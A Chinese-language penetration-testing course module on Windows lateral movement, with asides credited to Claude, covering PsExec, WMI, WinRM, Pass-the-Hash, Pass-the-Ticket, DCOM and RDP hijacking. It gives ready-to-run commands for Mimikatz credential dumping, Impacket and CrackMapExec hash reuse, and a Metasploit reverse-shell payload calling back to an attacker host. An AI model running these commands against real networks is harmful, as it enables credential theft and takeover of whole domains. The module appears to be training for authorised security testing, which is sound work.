# Module 14: 横向移动

---

## 【Claude的学习建议】

> **横向移动是渗透测试的核心技能！**
>
> 在真实的渗透测试中，你很少能一步到位拿下目标。通常的路径是：
> 1. 钓鱼获得一台普通员工电脑
> 2. 横向移动到IT管理员电脑
> 3. 再移动到域控制器
> 4. 最终控制整个域
>
> **学习目标**：
> - 理解横向移动的概念和目的
> - 掌握常见的横向移动技术（PsExec、WMI、WinRM）
> - 知道什么时候用什么技术
>
> **给零基础同学的话**：
> 横向移动就像是"在公司内部串门"：
> - 你进了公司大门（初始访问）
> - 但你只能进前台（普通员工电脑）
> - 你想进财务室（敏感服务器）
> - 横向移动就是找到进财务室的方法

## 第一节：横向移动技术概述

### 什么是横向移动？

横向移动是指攻击者在获得初始访问后，在网络内部从一台主机移动到另一台主机的过程，目的是扩大控制范围、获取更高权限或访问敏感数据。

> 【Claude的通俗解释】
>
> **横向移动的本质**：
>
> ```
> 你现在的位置          你想去的位置
> ┌─────────────┐      ┌─────────────┐
> │ 普通员工电脑 │ ───→ │ 域控制器    │
> │ (低权限)    │      │ (最高权限)  │
> └─────────────┘      └─────────────┘
>        │                    ↑
>        │    ┌─────────────┐ │
>        └──→ │ IT管理员电脑 │─┘
>             │ (中等权限)  │
>             └─────────────┘
>
> 这个"跳跃"的过程就是横向移动
> ```
>
> **为什么需要横向移动？**
> - 初始访问通常是低权限用户
> - 敏感数据在其他服务器上
> - 域控制器才是最终目标
> - 需要一步步"升级"

## 一、横向移动基础

### 1.1 横向移动目标

```
横向移动目标:
├── 获取更高权限账户
├── 访问敏感数据
├── 控制关键系统
├── 建立持久化
└── 达到最终目标 (域控等)
```

### 1.2 常见横向移动技术

| 技术 | 协议/端口 | 说明 |
|------|-----------|------|
| PsExec | SMB/445 | 远程执行服务 |
| WMI | DCOM/135 | Windows 管理 |
| WinRM | HTTP/5985,5986 | PowerShell 远程 |
| RDP | RDP/3389 | 远程桌面 |
| SSH | SSH/22 | Linux 远程 |
| DCOM | DCOM/135 | 分布式 COM |

> 【Claude的技术选择指南】
>
> **什么时候用什么技术？**
>
> | 场景 | 推荐技术 | 原因 |
> |------|----------|------|
> | 需要交互式Shell | WinRM/RDP | 支持交互操作 |
> | 需要隐蔽 | WMI | 不创建服务，日志少 |
> | 只有哈希没有密码 | PsExec(PTH) | 支持Pass-the-Hash |
> | 目标是Linux | SSH | Linux标准远程 |
> | 需要图形界面 | RDP | 远程桌面 |
>
> **端口开放检测**：
> ```powershell
> # 检测目标开放了哪些端口
> Test-NetConnection -ComputerName target -Port 445  # SMB
> Test-NetConnection -ComputerName target -Port 5985 # WinRM
> Test-NetConnection -ComputerName target -Port 3389 # RDP
> ```

### 1.3 所需凭证类型

```
凭证类型:
├── 明文密码
├── NTLM 哈希 (Pass-the-Hash)
├── Kerberos 票据 (Pass-the-Ticket)
├── SSH 密钥
└── 证书
```

> 【Claude的重要概念】
>
> **Pass-the-Hash (PTH) - 哈希传递攻击**
>
> 这是OSEP中非常重要的概念！
>
> ```
> 正常登录：
> 用户输入密码 → 计算哈希 → 发送哈希给服务器验证
>
> Pass-the-Hash：
> 攻击者直接用哈希 → 发送哈希给服务器验证
>
> 服务器只验证哈希，不关心你是怎么得到的！
> ```
>
> **这意味着**：
> - 你不需要知道明文密码
> - 只要有NTLM哈希就能登录
> - Mimikatz可以从内存中提取哈希
>
> **常见的PTH工具**：
> - Impacket (psexec, wmiexec, smbexec)
> - Mimikatz (sekurlsa::pth)
> - CrackMapExec

## 二、PsExec 横向移动

### 2.1 原理

```
PsExec 工作流程:
1. 通过 SMB 连接到目标 ADMIN$ 共享
2. 上传服务可执行文件
3. 创建并启动服务
4. 执行命令
5. 清理服务
```

### 2.2 Sysinternals PsExec

```cmd
# 基本用法
psexec \\target -u domain\user -p password cmd.exe

# 以 SYSTEM 权限运行
psexec \\target -u domain\user -p password -s cmd.exe

# 交互式 Shell
psexec \\target -u domain\user -p password -i cmd.exe

# 复制程序到目标执行
psexec \\target -u domain\user -p password -c payload.exe
```

### 2.3 Impacket PsExec

```bash
# 使用密码
impacket-psexec domain/user:password@target

# 使用 NTLM 哈希 (Pass-the-Hash)
impacket-psexec -hashes :NTLM_HASH domain/user@target

# 执行命令
impacket-psexec domain/user:password@target "whoami"
```

### 2.4 Metasploit PsExec

```bash
msf6> use exploit/windows/smb/psexec
msf6> set RHOSTS target
msf6> set SMBUser user
msf6> set SMBPass password
msf6> set SMBDomain domain
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set LHOST attacker_ip
msf6> run
```

## 三、WMI 横向移动

### 3.1 原理

```
WMI (Windows Management Instrumentation):
├── 使用 DCOM 协议
├── 端口 135 + 动态端口
├── 不会在目标创建服务
├── 更隐蔽
└── 需要管理员权限
```

### 3.2 wmic 命令

```cmd
# 远程执行命令
wmic /node:target /user:domain\user /password:password process call create "cmd.exe /c whoami > C:\output.txt"

# 查询进程
wmic /node:target /user:domain\user /password:password process list brief

# 查询服务
wmic /node:target /user:domain\user /password:password service list brief
```

### 3.3 PowerShell WMI

```powershell
# 创建凭证对象
$username = "domain\user"
$password = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

# 远程执行命令
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt" -ComputerName target -Credential $cred
```

### 3.4 Impacket WMIExec

```bash
# 使用密码
impacket-wmiexec domain/user:password@target

# 使用哈希
impacket-wmiexec -hashes :NTLM_HASH domain/user@target

# 执行命令
impacket-wmiexec domain/user:password@target "whoami"
```

## 四、WinRM 横向移动

### 4.1 原理

```
WinRM (Windows Remote Management):
├── 基于 HTTP/HTTPS
├── 端口 5985 (HTTP) / 5986 (HTTPS)
├── PowerShell 远程管理
├── 需要目标启用 WinRM
└── 支持 Kerberos 和 NTLM 认证
```

### 4.2 PowerShell Remoting

```powershell
# 创建凭证
$cred = Get-Credential

# 进入远程会话
Enter-PSSession -ComputerName target -Credential $cred

# 执行远程命令
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }

# 在多台主机上执行
Invoke-Command -ComputerName host1,host2,host3 -Credential $cred -ScriptBlock { hostname }
```

### 4.3 Evil-WinRM

```bash
# 使用密码
evil-winrm -i target -u user -p password

# 使用哈希
evil-winrm -i target -u user -H NTLM_HASH

# 上传文件
*Evil-WinRM* PS> upload /path/to/local/file C:\path\to\remote\file

# 下载文件
*Evil-WinRM* PS> download C:\path\to\remote\file /path/to/local/file
```

## 五、Pass-the-Hash (PTH)

### 5.1 原理

```
Pass-the-Hash:
├── 使用 NTLM 哈希代替密码
├── 不需要知道明文密码
├── 利用 NTLM 认证机制
├── 适用于 SMB、WMI、WinRM 等
└── 需要本地管理员权限获取哈希
```

### 5.2 获取哈希

```powershell
# Mimikatz
mimikatz# sekurlsa::logonpasswords

# 输出示例:
# NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### 5.3 使用哈希

```bash
# Impacket
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain/user@target

# CrackMapExec
crackmapexec smb target -u user -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Evil-WinRM
evil-winrm -i target -u user -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

### 5.4 Mimikatz PTH

```
mimikatz# sekurlsa::pth /user:user /domain:domain /ntlm:HASH /run:cmd.exe
```

## 六、Pass-the-Ticket (PTT)

### 6.1 原理

```
Pass-the-Ticket:
├── 使用 Kerberos 票据
├── 不需要密码或哈希
├── 利用 Kerberos 认证
├── 票据有时效性
└── 可以使用 TGT 或服务票据
```

### 6.2 导出票据

```
# Mimikatz 导出票据
mimikatz# sekurlsa::tickets /export

# 查看当前票据
mimikatz# kerberos::list
```

### 6.3 导入票据

```
# Mimikatz 导入票据
mimikatz# kerberos::ptt ticket.kirbi

# Rubeus 导入票据
Rubeus.exe ptt /ticket:base64_ticket
```

### 6.4 使用票据

```powershell
# 导入票据后，可以直接访问资源
dir \\target\C$

# 或使用 PsExec
psexec \\target cmd.exe
```

## 七、DCOM 横向移动

### 7.1 原理

```
DCOM (Distributed COM):
├── 允许远程调用 COM 对象
├── 端口 135 + 动态端口
├── 多种可利用的 COM 对象
└── 相对隐蔽
```

### 7.2 常用 DCOM 对象

| 对象 | CLSID | 方法 |
|------|-------|------|
| MMC20.Application | 49B2791A-B1AE-4C90-9B8E-E860BA07F889 | ExecuteShellCommand |
| ShellWindows | 9BA05972-F6A8-11CF-A442-00A0C90A8F39 | Item().Document.Application.ShellExecute |
| ShellBrowserWindow | C08AFD90-F2A1-11D1-8455-00A0C91F3880 | Document.Application.ShellExecute |

### 7.3 PowerShell DCOM

```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "target"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
```

## 八、RDP 横向移动

### 8.1 基本连接

```cmd
# Windows 远程桌面
mstsc /v:target

# 指定用户
mstsc /v:target /admin
```

### 8.2 xfreerdp (Linux)

```bash
# 基本连接
xfreerdp /u:user /p:password /v:target

# 使用 NTLM 哈希
xfreerdp /u:user /pth:NTLM_HASH /v:target

# 共享本地目录
xfreerdp /u:user /p:password /v:target /drive:share,/tmp
```

### 8.3 RDP 劫持

```cmd
# 查看会话
query user

# 劫持会话 (需要 SYSTEM 权限)
tscon SESSION_ID /dest:rdp-tcp#0
```

## 九、实践示例

### 9.1 横向移动流程

```
1. 信息收集
   - 枚举网络主机
   - 识别高价值目标
   - 收集凭证

2. 选择技术
   - 根据目标开放端口选择
   - 根据拥有的凭证类型选择
   - 考虑隐蔽性

3. 执行横向移动
   - 使用合适的工具
   - 建立访问
   - 验证权限

4. 后续操作
   - 收集更多凭证
   - 建立持久化
   - 继续横向移动
```

### 9.2 CrackMapExec 批量操作

```bash
# 扫描 SMB
crackmapexec smb 192.168.1.0/24

# 使用凭证测试
crackmapexec smb 192.168.1.0/24 -u user -p password

# 执行命令
crackmapexec smb targets.txt -u user -p password -x "whoami"

# 使用哈希
crackmapexec smb targets.txt -u user -H HASH --local-auth
```
